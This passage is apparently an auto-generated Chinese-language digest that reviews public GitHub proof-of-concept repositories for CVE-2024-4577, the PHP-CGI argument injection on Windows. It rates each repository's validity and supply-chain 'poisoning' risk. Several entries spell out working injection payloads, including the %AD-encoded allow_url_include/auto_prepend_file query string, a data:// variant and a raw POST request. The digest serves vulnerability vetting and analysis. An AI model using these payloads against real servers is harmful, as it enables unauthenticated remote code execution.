仔细检查了提供的POC代码，未发现任何明显的投毒迹象。代码逻辑清晰，主要功能是发送精心构造的HTTP请求，并检查响应以确认漏洞的存在。使用的PHP代码也是为了执行预定的测试命令，没有发现任何试图在目标系统上安装后门或执行恶意操作的代码。

**搜索引擎结果：**

搜索结果表明CVE-2024-4577是一个严重的、广泛利用的漏洞。多个安全厂商和研究人员都发布了相关的分析和警告。该漏洞已被添加到CISA的已知被利用漏洞目录（KEV），表明该漏洞在野外被积极利用。


**项目地址:** [Jcccccx/CVE-2024-4577](https://github.com/Jcccccx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #12

**来源**: [CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md](../2024/CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows上PHP-CGI的远程代码执行漏洞。当PHP以CGI模式运行时，如果系统配置了使用"Best-Fit"策略的代码页，Windows可能会使用此策略替换传递给Win32 API函数的命令行中的字符。 PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，这可能导致泄露脚本源码、在服务器上运行任意PHP代码等。

**漏洞利用方式：**

1.  **攻击向量：** 通过构造特定的URL或POST请求，向PHP-CGI传递恶意参数。
2.  **参数注入：** 攻击者可以使用"Best-Fit"转换后的字符来注入PHP配置选项，例如`allow_url_include`和`auto_prepend_file`。
3.  **远程代码执行：** 利用`allow_url_include=1`和`auto_prepend_file=php://input`，攻击者可以将任意PHP代码作为请求体发送到服务器执行。

**POC有效性：**

提供的POC代码（`cve_2024_4577_checker.sh`）是一个漏洞检测脚本，用于扫描目标是否存在CVE-2024-4577漏洞。它通过发送包含恶意参数的HTTP请求来判断目标是否容易受到攻击。根据漏洞库信息和搜索结果,此漏洞已存在公开可用的exp. 

**投毒风险：**

该漏洞利用代码主要包含了一个检测脚本,用于检测目标是否存在漏洞, 漏洞利用代码本身主要用于检测,未发现明显的恶意行为。 但是为了保证绝对安全,仍需要人工review代码,  投毒风险较低，约为 1%.

**项目地址:** [JeninSutradhar/CVE-2024-4577-checker](https://github.com/JeninSutradhar/CVE-2024-4577-checker)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #13

**来源**: [CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md](../2024/CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，并且系统启用了使用“Best Fit”策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows系统上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而可能泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞信息和搜索结果，以及利用代码，该漏洞利用的有效性很高。多个来源表明该漏洞已被积极利用，并且存在公开可用的PoC代码。

**投毒风险：**
分析提供的PoC代码 `CVE-2024-4577.py`，未发现明显的恶意投毒代码。PoC主要功能是检测目标是否存在漏洞，并提供一个交互式shell来执行命令。代码中包含了一些编码转换和请求发送，但没有发现植入后门的迹象。但是，任何下载和执行来自不可信来源的脚本都存在风险，需要进行代码审计。

根据经验判断，投毒风险约为5%。

**利用方式：**
1.  **漏洞触发：** 攻击者需要向目标服务器发送特制的HTTP请求，请求中包含经过特殊编码的恶意PHP选项作为查询字符串参数。这些参数会被传递给php-cgi.exe。
2.  **参数注入：**  利用Windows系统的“Best-Fit”字符转换特性，构造出PHP可以识别的参数。PoC代码中使用了`%AD`代替`-`，`%3D`代替`=`，`+`代替空格。
3.  **远程代码执行：**  通过注入`-d allow_url_include=1 -d auto_prepend_file=php://input`等参数，允许包含远程文件，并将POST请求的内容作为PHP代码执行，从而实现远程代码执行。
4.  **信息泄露：** 攻击者可以通过参数注入来读取服务器上的任意文件。
5.  **交互式Shell：** 通过循环发送请求，模拟一个交互式Shell，允许攻击者执行任意命令。

**项目地址:** [K3ysTr0K3R/CVE-2024-4577-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #14

**来源**: [CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md](../2024/CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md)

## CVE-2024-4577 - PHP-CGI 参数注入导致RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows服务器，PHP以CGI模式运行，开启了使用"Best Fit"策略的编码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个存在于Windows环境下以CGI模式运行的PHP中的高危漏洞。由于Windows系统在特定代码页下，会使用"Best-Fit"策略转换命令行参数中的字符，PHP-CGI模块可能错误地将这些字符解析为PHP选项，从而允许攻击者注入恶意PHP代码。  

**利用方式：**
攻击者通过构造包含特定字符的URL，欺骗PHP-CGI解析器将恶意代码作为配置选项执行。POC代码`cve_2024_4577_tester.py`通过发送包含如下Payload的POST请求来验证漏洞：

```
?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input
```
以及 POST Body:
```php
<?php echo 'CVE-2024-4577-TEST'; ?>
```
其中，`%AD` 和 `d` 的组合是为了绕过某些安全限制。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input`  将POST请求的内容作为PHP代码执行。

**投毒风险分析：**
虽然POC代码本身是为了验证漏洞，但仍然存在一定的投毒风险。该脚本从用户处获取目标URL，然后发送包含PHP代码的POST请求。如果攻击者修改此脚本，例如：

1.  **修改Payload：**  将测试用的`echo`语句替换为更隐蔽的恶意代码，例如反弹shell，上传webshell等。
2.  **增加后门：**  在成功利用漏洞后，在目标服务器上留下后门，以便长期控制。
3.  **信息收集：**  收集用户输入的目标URL和其他信息，发送给攻击者。

尽管存在风险，但此POC代码相对简单，风险主要取决于使用者是否对其进行修改和滥用。 由于代码短小, 容易审核, 投毒风险较低, 估计为 5%。

**项目地址:** [KimJuhyeong95/cve-2024-4577](https://github.com/KimJuhyeong95/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #15

**来源**: [CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md](../2024/CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md)

## CVE-2024-4577 PHP-CGI 参数注入 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，系统配置使用特定的代码页，允许Best-Fit转换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 系统下以 CGI 模式运行的 PHP 版本中。如果系统配置使用了某些代码页，Windows 可能会使用 "Best-Fit" 策略来替换命令行参数中的字符。PHP CGI 模块可能错误地将这些字符解析为 PHP 选项，从而允许攻击者向 PHP 二进制文件传递选项，导致泄露源代码、执行任意 PHP 代码甚至执行系统命令。

**有效性：**
提供的漏洞利用代码看起来是有效的。它是一个 Python 脚本，旨在自动化 CVE-2024-4577 和 CVE-2024-8926 的利用。它提供了多种攻击模式，例如执行系统命令、执行 PHP 代码、上传和下载文件。脚本还具有 Tor 代理支持、日志记录和自动编码转换等功能，这表明它是一个功能齐全的漏洞利用工具。

**投毒风险：**
该仓库的投毒风险评估为 10%。该脚本主要利用了已知的漏洞，并没有明显的恶意代码。风险主要来自于以下几点：
* 使用 Tor 代理支持，有可能会连接到恶意的 Tor 节点。
* 脚本提供文件上传功能，攻击者可能会上传恶意文件到服务器。
* 脚本的作者身份未知，存在潜在的供应链风险。

**利用方式：**
1.  **环境准备：**  攻击者需要一个运行易受攻击的 PHP 版本的 Windows 服务器，并以 CGI 模式运行。此外，系统还应配置为使用具有 Best-Fit 转换的代码页。
2.  **漏洞利用：**  攻击者将构造一个包含恶意 PHP 选项的 HTTP 请求。由于 Best-Fit 转换，服务器会将某些字符替换为其他字符，这将被 PHP CGI 模块错误地解析为 PHP 选项。例如，攻击者可以传递 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，以允许包含远程文件并执行任意 PHP 代码。
3.  **远程代码执行：**  通过上述操作，攻击者可以执行任意 PHP 代码，包括执行系统命令、上传 webshell 等。

综上所述，CVE-2024-4577 是一个严重的安全漏洞，利用起来相对简单，攻击后果非常严重，可能导致服务器完全沦陷。强烈建议受影响的用户尽快升级到受保护的版本。

**项目地址:** [Night-have-dreams/php-cgi-Injector](https://github.com/Night-have-dreams/php-cgi-Injector)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #16

**来源**: [CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md](../2024/CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的 PHP 服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows 系统，运行于 CGI 模式下的 PHP，且系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统以 CGI 模式运行时，由于系统代码页的 "Best Fit" 行为导致参数注入的远程代码执行漏洞。攻击者可以通过构造恶意的 HTTP 请求，将恶意参数传递给 PHP 解释器，从而执行任意代码。

**有效性评估：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞的有效性很高。漏洞库明确指出该漏洞的存在，并提供了受影响的版本范围。搜索引擎结果显示，该漏洞在野外已存在利用，且有公开的 PoC 代码可供验证。漏洞利用代码（Incident Response Walkthrough）提供了一个应对 CVE-2024-4577 攻击的案例分析，虽未直接提供 PoC 代码，但分析过程表明了该漏洞可被利用，并附带了模拟攻击场景。

**投毒风险分析：**

提供的漏洞利用代码主要是一个事件响应的演练文档，用于分析和缓解 CVE-2024-4577 漏洞。它主要关注识别漏洞、分析攻击者行为以及确定受影响的系统。虽然该文档提到了攻击者可能执行的命令（whoami.exe、calc.exe），但它本身并不包含任何恶意代码。因此，可以认为此仓库中作者隐藏的投毒代码的可能性较低，约为 5%。 这 5% 的可能性是基于对任何代码库都不能完全排除潜在风险的一般安全考虑。

**利用方式分析：**

1.  **环境要求：** 目标系统必须是 Windows，PHP 运行于 CGI 模式，并且启用了使用 "Best Fit" 策略的代码页。
2.  **漏洞触发：** 攻击者发送包含恶意构造参数的 HTTP 请求。这些参数会被 Windows 的 "Best Fit" 代码页转换机制错误地解释为 PHP 选项。
3.  **代码执行：** PHP 解释器执行被注入的恶意选项，导致任意代码执行。

攻击者通过构造特殊的 URL 或 POST 数据，将恶意的 PHP 参数注入到 PHP 进程中。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数直接执行 PHP 代码。利用方式依赖于服务器的配置和 PHP 版本的具体细节。

**项目地址:** [PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough](https://github.com/PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #17

**来源**: [CVE-2024-4577-Skycritch_CVE-2024-4577.md](../2024/CVE-2024-4577-Skycritch_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是PHP的一个远程代码执行漏洞，存在于Windows系统上以CGI模式运行的PHP中。当系统配置为使用某些代码页时，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码，在服务器上运行任意PHP代码等。 

**有效性分析：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，存在公开的PoC利用代码。漏洞利用代码 `CVE-2024-4577.py` 尝试通过在URL中注入PHP选项来利用此漏洞。具体来说，它设置 `allow_url_include` 为 1，并使用 `auto_prepend_file` 包含 `php://input`，然后将要执行的PHP代码通过POST请求发送到目标URL。如果返回结果中包含“1337”，则认为漏洞利用成功。

**投毒风险分析：**
查看提供的POC代码，主要功能是利用漏洞执行任意PHP代码。 `CVE-2024-4577.py`  没有发现明显的恶意代码，该脚本的主要作用是发送包含恶意PHP代码的请求。风险很低。
`README.md`文件只包含漏洞名称，没有投毒风险。
整体投毒风险评估为1%。

**利用方式：**
利用方式如下：
1.  攻击者需要找到运行在Windows服务器上的、使用CGI模式的、且存在漏洞的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）。
2.  攻击者构造包含恶意PHP选项的URL，并将其附加到目标PHP脚本的URL后面。
3.  攻击者使用POST请求将要执行的PHP代码发送到服务器。
4.  如果漏洞利用成功，服务器将执行攻击者提供的PHP代码。

**优先级排序依据：**
根据您的要求，分析时遵循以下优先级：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息。
搜索引擎结果用于确认漏洞的广泛性和影响，漏洞利用代码用于分析利用方式和潜在的投毒风险，漏洞库信息用于验证漏洞的存在和影响范围。

**项目地址:** [Skycritch/CVE-2024-4577](https://github.com/Skycritch/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #18

**来源**: [CVE-2024-4577-VictorShem_CVE-2024-4577.md](../2024/CVE-2024-4577-VictorShem_CVE-2024-4577.md)

## CVE-2024-4577 - PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (运行于 Windows CGI 模式)

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统上 PHP 以 CGI 模式运行，且系统启用了使用 "Best Fit" 策略的代码页。通常是 XAMPP 环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统中以 CGI 模式运行时的一个参数注入漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或执行任意 PHP 代码。

**有效性：** 提供的 POC 代码 `CVE-2024-4577.yaml` 看起来是有效的 Nuclei 模板，旨在检测和利用此漏洞。它通过向目标 URL 发送带有特殊构造的 payload 的 HTTP 请求，payload 中包含 `%AD` 字符和恶意的 PHP 配置选项（`allow_url_include=1` 和 `auto_prepend_file=php://input`），以及要执行的 PHP 代码（`<?php phpinfo(); ?>`）。如果漏洞存在且利用成功，服务器应该返回包含 PHP 版本信息的页面。

**投毒风险：**
查看了提供的 POC 代码 `CVE-2024-4577.yaml` 和 `README.md` 文件。其中利用方式是通过构造特定的 URL，包含 `%AD` 字符以及 `allow_url_include` 和 `auto_prepend_file` 等配置项，结合 POST 请求执行 PHP 代码。这个利用过程本身就是一种后门植入的方式，但这是漏洞利用的固有行为，不应被视为恶意投毒。

`README.md` 中包含用于 FOFA 和 Censys 的搜索语句，用于发现暴露在公网上的 XAMPP 服务器。这部分内容本身无害，只是为了方便漏洞发现和利用。但也可能会被恶意攻击者利用。

综合来看，该仓库中不存在明显的恶意投毒代码，但存在被滥用的风险，因此给出 10% 的投毒风险。

**利用方式：**
1.  **环境准备：** 目标系统必须是运行在 Windows 上的 PHP，并且是以 CGI 模式运行。同时，系统的代码页需要启用 "Best Fit" 策略。
2.  **构造 Payload：** 攻击者需要构造包含 `%AD` 字符的特殊 URL，以及恶意的 PHP 配置选项，例如 `allow_url_include=1` 和 `auto_prepend_file=php://input`。其中 `%AD` 是触发 Windows "Best Fit" 转换的关键。
3.  **发送请求：** 攻击者通过 HTTP POST 请求将构造好的 payload 发送到目标服务器的 PHP 脚本，同时在 POST body 中包含要执行的 PHP 代码。
4.  **远程代码执行：** 如果漏洞存在且利用成功，目标服务器将执行 POST body 中的 PHP 代码，从而实现远程代码执行。

**项目地址:** [VictorShem/CVE-2024-4577](https://github.com/VictorShem/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #19

**来源**: [CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，运行于Windows+Apache+PHP-CGI环境，且启用了Best-Fit策略的CodePage

**利用条件:** 目标服务器需满足特定PHP版本、Windows环境、Apache服务器、PHP-CGI模式，以及存在使用Best-Fit策略的CodePage设置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，存在于Windows平台的特定PHP版本中。攻击者可以通过精心构造的URL，利用Windows系统的“Best Fit”字符转换特性，将恶意参数注入到PHP的执行命令中，最终实现远程代码执行。 

**有效性:**
提供的POC代码是有效的，通过发送包含`allow_url_include`和`auto_prepend_file`参数的POST请求，并包含PHP代码`<?php phpinfo(); ?>`，如果目标存在漏洞，则会执行该代码并返回`phpinfo()`的结果。

**投毒风险:**
提供的代码主要用于检测漏洞是否存在，功能较为直接，没有发现隐藏的恶意代码或后门。该仓库的`CODEOWNERS`文件中只包含`@zephrfish`，该用户有代码审核权，因此综合评估认为投毒的可能性较低。

**利用方式:**
1.  **环境确认:** 漏洞利用前需要确认目标服务器是否满足以下条件：
    *   Windows操作系统
    *   Apache服务器
    *   PHP以CGI模式运行
    *   PHP版本为受影响的范围（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）
    *   系统启用了使用“Best-Fit”策略的CodePage
2.  **构造恶意URL:** 构造包含恶意参数的URL。关键在于使用`%25ADd`来代替`-d`，结合`allow_url_include`和`auto_prepend_file`选项，允许远程包含恶意PHP代码。
3.  **发送请求:** 使用POST方法发送包含PHP代码的请求，例如`<?php phpinfo(); ?>`或更具危害性的代码。
4.  **执行任意代码:** 成功利用漏洞后，可以在目标服务器上执行任意PHP代码，从而控制服务器。

**项目地址:** [ZephrFish/CVE-2024-4577-PHP-RCE](https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #20

**来源**: [CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP (Windows CGI)

**危害等级:** 极高，远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个存在于Windows PHP-CGI配置中的严重漏洞。当PHP以CGI模式在Windows服务器上运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”策略来替换命令行参数中的字符。PHP-CGI模块可能会错误地将这些替换后的字符解析为PHP选项，从而允许攻击者向PHP二进制文件传递恶意参数。这可能导致泄露脚本源码，执行任意PHP代码，甚至在服务器上执行操作系统命令。

**利用方式：**

1.  **攻击向量：** 通过HTTP请求，构造恶意的URL或POST数据，向PHP-CGI传递恶意参数。
2.  **利用条件：**
    *   目标服务器是Windows系统。
    *   PHP以CGI模式运行。
    *   Web服务器（如Apache）用于处理PHP请求。
    *   系统启用了特定的代码页，允许字符替换。
3.  **攻击步骤：**
    *   利用Windows的“Best-Fit”字符替换机制，将特殊字符转换为PHP选项。
    *   通过`?`或`-`等字符引导，注入恶意PHP配置选项，例如`-d allow_url_include=1 -d auto_prepend_file=php://input`。
    *   通过`POST`请求发送PHP代码，实现远程代码执行。

**有效性：**

根据漏洞描述、搜索结果以及提供的POC代码，该漏洞的利用是有效的。已经有公开的PoC代码可以实现远程代码执行。漏洞库信息和搜索引擎结果都确认了该漏洞的存在以及可利用性。

提供的PoC利用了DNS重绑定技术，允许攻击者通过受害者的浏览器，对内网的PHP-CGI服务器进行攻击。这个方法绕过了同源策略(SOP)，使得攻击者能够攻击原本无法直接从外部访问的内网系统。

**投毒风险：**

提供的PoC代码主要由三个部分组成: `README.md`, `client.html`。其中`README.md`文件主要描述漏洞原理、利用方式和配置说明，`client.html`是漏洞利用的核心代码。

*  **client.html分析:**  该文件包含Javascript代码，用于执行DNS重绑定攻击，并向目标IP发送包含恶意payload的请求。攻击payload可以在 `client.html`文件中被修改.

虽然该PoC本身旨在利用漏洞，但以下情况可能构成投毒风险：

1.  **依赖的第三方服务:**  PoC依赖于`duckdns.org`提供DNS服务, 一旦服务出现问题或者被劫持,可能会导致PoC失效甚至被恶意利用。
2.  **内网扫描IP列表:** `client.html`中包含一个可以修改的内网IP列表. 如果这个列表被替换成其他恶意IP地址，可能导致攻击者扫描或攻击非预期目标。
3.  **Payload内容:**  虽然默认的payload为`calc`,用户可以自定义payload,潜在的风险在于如果用户不熟悉PHP, 可能会引入不安全的PHP代码或者连接恶意URL。
4.  **DNS Rebinding 的滥用:**  DNS Rebinding 本身就是一项有争议的技术，在没有充分安全措施的情况下使用，可能会造成隐私泄露或者其他安全问题。

因此，综合考量，该仓库的投毒风险评定为10%。主要风险在于使用者可能修改PoC中的payload或者IP列表，从而引入额外的风险。作者本身并没有加入后门代码。

**项目地址:** [ZeroMemoryEx/PHP-CGI-INTERNAL-RCE](https://github.com/ZeroMemoryEx/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #21

**来源**: [CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #22

**来源**: [CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md](../2024/CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8（Windows环境，CGI模式，开启Best Fit策略的CodePage）

**利用条件:** Windows系统，PHP以CGI模式运行，启用了使用"Best Fit"策略的CodePage。目标服务器未安装补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP CGI参数注入漏洞，存在于PHP的Windows版本中，当PHP以CGI模式运行时，如果系统设置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行参数中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本的源代码，或者在服务器上执行任意PHP代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞影响特定版本的PHP，并且有公开的PoC代码，证明该漏洞是有效的。多个安全厂商和研究人员已经确认了该漏洞的存在并发布了相关的分析和利用方法。

**投毒风险：**
提供的CTF_WALKTHROUGH.md文件本身是漏洞利用的教程，其中包含的攻击脚本用于测试、文件读取、命令执行、容器逃逸、AWS权限提升以及持久化等攻击步骤。这些脚本可以被用于恶意目的，但教程本身是中立的，风险点在于用户是否清楚脚本的功能，是否存在其他关联的，具有恶意目的的脚本或配置，因此投毒风险为10%。因为没有发现明显的恶意代码，所以投毒风险较低。

**利用方式：**
